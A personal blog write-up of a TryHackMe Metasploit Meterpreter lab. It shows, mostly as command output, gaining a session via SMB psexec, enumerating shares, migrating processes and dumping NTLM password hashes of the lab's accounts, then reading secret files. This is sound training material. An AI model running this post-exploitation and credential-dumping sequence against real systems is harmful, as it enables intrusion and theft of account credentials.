---
layout: post
title:  "THM: Metasploit: Meterpreter"
date:   2024-02-07 13:50:01 -0600
categories: TryHackMe
image: /assets/img/metasploit-meterpreter.png
---
[etasploit: Meterpreter](https://tryhackme.com/room/meterpreter)
Take a deep dive into Meterpreter, and see how in-memory payloads can be used for post-exploitation.

I can't believe it!  Maybe I'm finally getting this hacking thing!  
Aside from the password of jchamers I was able to get most of the answers myself!

Ok, let me not get a big head, but it was quite a difference to do a room 80% by myself

On to the room

I had an interesting time attempting to get the exploit to work as the first time it failed and I thought I made a mistake
```
msf6 > search  windows smb psexec

Matching Modules
================

   #  Name                                         Disclosure Date  Rank    Check  Description
   -  ----                                         ---------------  ----    -----  -----------
   0  exploit/windows/smb/ms17_010_psexec          2017-03-14       normal  Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
   1  auxiliary/admin/smb/ms17_010_command         2017-03-14       normal  No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution
   2  auxiliary/scanner/smb/psexec_loggedin_users                   normal  No     Microsoft Windows Authenticated Logged In Users Enumeration
   3  exploit/windows/smb/psexec                   1999-01-01       manual  No     Microsoft Windows Authenticated User Code Execution
   4  exploit/windows/smb/webexec                  2018-10-24       manual  No     WebExec Authenticated User Code Execution

I initially went for #3, but when it didn't work I went to #1
However, both gave me an error

I retried #3 and then it worked and I was in!
```
Let's go for the first few things the task is asking for!

```
meterpreter > sysinfo
Computer        : {redacted}
OS              : Windows 2016+ (10.0 Build 17763).
Architecture    : x64
System Language : en_US
Domain          : {redacted}
Logged On Users : 7
Meterpreter     : x86/windows
```
How about the shares?

```
meterpreter > run post/windows/gather/enum_shares

[*] Running module against ACME-TEST (10.10.225.29)
[*] The following shares were found:
[*] 	Name: SYSVOL
[*] 	Path: C:\Windows\SYSVOL\sysvol
[*] 	Remark: Logon server share 
[*] 	Type: DISK
[*] 
[*] 	Name: NETLOGON
[*] 	Path: C:\Windows\SYSVOL\sysvol\FLASH.local\SCRIPTS
[*] 	Remark: Logon server share 
[*] 	Type: DISK
[*] 
[*] 	Name: {redacted}
[*] 	Path: C:\Shares\{redacted}
[*] 	Type: DISK

```
After that I kept getting errors for the hashdump

```
meterpreter > run post/windows/gather/hashdump

[*] Obtaining the boot key...
[*] Calculating the hboot key using SYSKEY 36c8d26ec0df8b23ce63bcefa6e2d821...
[*] Obtaining the user list and keys...
[*] Decrypting user keys...
[-] Post failed: NoMethodError undefined method `unpack' for nil:NilClass
[-] Call stack:
[-]   /opt/metasploit-framework/embedded/framework/modules/post/windows/gather/hashdump.rb:261:in `decrypt_user_hash'
[-]   /opt/metasploit-framework/embedded/framework/modules/post/windows/gather/hashdump.rb:233:in `block in decrypt_user_keys'
[-]   /opt/metasploit-framework/embedded/framework/modules/post/windows/gather/hashdump.rb:222:in `each_key'
[-]   /opt/metasploit-framework/embedded/framework/modules/post/windows/gather/hashdump.rb:222:in `decrypt_user_keys'
[-]   /opt/metasploit-framework/embedded/framework/modules/post/windows/gather/hashdump.rb:55:in `run'
meterpreter > ps


meterpreter > hashdump
[-] priv_passwd_get_sam_hashes: Operation failed: The parameter is incorrect.
meterpreter > run post/windows/gather/hashdump

[*] Obtaining the boot key...
[*] Calculating the hboot key using SYSKEY 36c8d26ec0df8b23ce63bcefa6e2d821...
[*] Obtaining the user list and keys...
[*] Decrypting user keys...
[-] Post failed: NoMethodError undefined method `unpack' for nil:NilClass
[-] Call stack:
[-]   /opt/metasploit-framework/embedded/framework/modules/post/windows/gather/hashdump.rb:261:in `decrypt_user_hash'
[-]   /opt/metasploit-framework/embedded/framework/modules/post/windows/gather/hashdump.rb:233:in `block in decrypt_user_keys'
[-]   /opt/metasploit-framework/embedded/framework/modules/post/windows/gather/hashdump.rb:222:in `each_key'
[-]   /opt/metasploit-framework/embedded/framework/modules/post/windows/gather/hashdump.rb:222:in `decrypt_user_keys'
[-]   /opt/metasploit-framework/embedded/framework/modules/post/windows/gather/hashdump.rb:55:in `run'
meterpreter > run post/windows/gather/credentials/credential_collector 

[*] Running module against ACME-TEST
[-] Error accessing hashes, did you migrate to a process that matched the target's architecture?

```
Reading careful on the error maybe I'm supposed to switch
```
meterpreter > ps

Process List
============

 PID   PPID  Name                                       Arch  Session  User                          Path
 ---   ----  ----                                       ----  -------  ----                          ----
 0     0     [System Process]
 4     0     System                                     x64   0
 68    4     Registry                                   x64   0
 396   4     smss.exe                                   x64   0
 496   688   dwm.exe                                    x64   1        Window Manager\DWM-1          C:\Windows\System32\dwm.exe
 548   536   csrss.exe                                  x64   0
 624   616   csrss.exe                                  x64   1
 640   536   wininit.exe                                x64   0
 688   616   winlogon.exe                               x64   1        NT AUTHORITY\SYSTEM           C:\Windows\System32\winlogon.exe
 752   640   services.exe                               x64   0
 776   640   lsass.exe                                  x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\lsass.exe
 836   752   svchost.exe                                x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
 856   752   msdtc.exe                                  x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\System32\msdtc.exe
 884   752   svchost.exe                                x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\System32\svchost.exe
 956   752   svchost.exe                                x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
 996   752   svchost.exe                                x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\System32\svchost.exe
 1060  752   svchost.exe                                x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
 1160  752   svchost.exe                                x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
 1168  752   svchost.exe                                x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
 1176  752   svchost.exe                                x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
 1224  752   svchost.exe                                x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\System32\svchost.exe
 1380  752   svchost.exe                                x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
 1416  752   svchost.exe                                x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
 1436  752   svchost.exe                                x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
 1724  752   svchost.exe                                x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
 2176  640   fontdrvhost.exe                            x64   0        Font Driver Host\UMFD-0       C:\Windows\System32\fontdrvhost.exe
 2184  688   fontdrvhost.exe                            x64   1        Font Driver Host\UMFD-1       C:\Windows\System32\fontdrvhost.exe
 2220  752   spoolsv.exe                                x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\spoolsv.exe
 2276  752   svchost.exe                                x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
 2288  752   svchost.exe                                x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
 2348  752   svchost.exe                                x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
 2372  752   amazon-ssm-agent.exe                       x64   0        NT AUTHORITY\SYSTEM           C:\Program Files\Amazon\SSM\amazon-ssm-agent.exe
 2408  752   LiteAgent.exe                              x64   0        NT AUTHORITY\SYSTEM           C:\Program Files\Amazon\XenTools\LiteAgent.exe
 2428  752   dfsrs.exe                                  x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\dfsrs.exe
 2440  752   ismserv.exe                                x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\ismserv.exe
 2452  752   Microsoft.ActiveDirectory.WebServices.exe  x64   0        NT AUTHORITY\SYSTEM           C:\Windows\ADWS\Microsoft.ActiveDirectory.WebServices.exe
 2496  752   dfssvc.exe                                 x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\dfssvc.exe
 2508  752   dns.exe                                    x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\dns.exe
 2924  752   vds.exe                                    x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\vds.exe
 2948  2372  ssm-agent-worker.exe                       x64   0        NT AUTHORITY\SYSTEM           C:\Program Files\Amazon\SSM\ssm-agent-worker.exe
 2956  2948  conhost.exe                                x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\conhost.exe
 2960  3452  conhost.exe                                x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\conhost.exe
 3172  688   LogonUI.exe                                x64   1        NT AUTHORITY\SYSTEM           C:\Windows\System32\LogonUI.exe
 3240  956   WmiPrvSE.exe                               x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\wbem\WmiPrvSE.exe
 3452  1236  powershell.exe                             x86   0        NT AUTHORITY\SYSTEM           C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe

meterpreter > migrate 1236
[*] Migrating from 3452 to 1236...
[-] Error running command migrate: Rex::RuntimeError Cannot migrate into non existent process
meterpreter > migrate 3172
[*] Migrating from 3452 to 3172...
[*] Migration completed successfully.

```
I'm not sure why I choose the 3172, but in the hint they want you to do lsass.exe, but I didn't look at the hint.

```
meterpreter > run post/windows/gather/credentials/credential_collector

[*] Running module against ACME-TEST
[+] Collecting hashes...
    Extracted: Administrator:aad3b435b51404eeaad3b435b51404ee:58a478135a93ac3bf058a5ea0e8fdb71
    Extracted: Guest:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0
    Extracted: krbtgt:aad3b435b51404eeaad3b435b51404ee:a9ac3de200cb4d510fed7610c7037292
    Extracted: ballen:aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b
    Extracted: jchambers:{redacted}
    Extracted: jfox:aad3b435b51404eeaad3b435b51404ee:c64540b95e2b2f36f0291c3a9fb8b840
    Extracted: lnelson:aad3b435b51404eeaad3b435b51404ee:e88186a7bb7980c913dc90c7caa2a3b9
    Extracted: erptest:aad3b435b51404eeaad3b435b51404ee:8b9ca7572fe60a1559686dba90726715
    Extracted: ACME-TEST$:aad3b435b51404eeaad3b435b51404ee:386be053c399e155eb83d97c3502a429
[+] Collecting tokens...
    Font Driver Host\UMFD-0
    Font Driver Host\UMFD-1
    NT AUTHORITY\LOCAL SERVICE
    NT AUTHORITY\NETWORK SERVICE
    NT AUTHORITY\SYSTEM
    Window Manager\DWM-1
    No tokens available

```
ok great now I got the hash, now what?
This is the part I didn't know.  I read on a write up to go to crackstation and paste the hash which worked and I answered the question correctly.

```
meterpreter > search -f secrets.txt
Found 1 result...
=================

Path                                                            Size (bytes)  Modified (UTC)
----                                                            ------------  --------------
{redacted}  35            2021-07-30 08:44:27 +0100

meterpreter > cat '{redacted}'

meterpreter > search -f realsecret.txt
Found 1 result...
=================

Path                               Size (bytes)  Modified (UTC)
----                               ------------  --------------
{redacted}  34            2021-07-30 09:30:24 +0100

meterpreter > cat '{redacted}'
```
Aside from the crackstation website I was able to get most of the room done by myself!
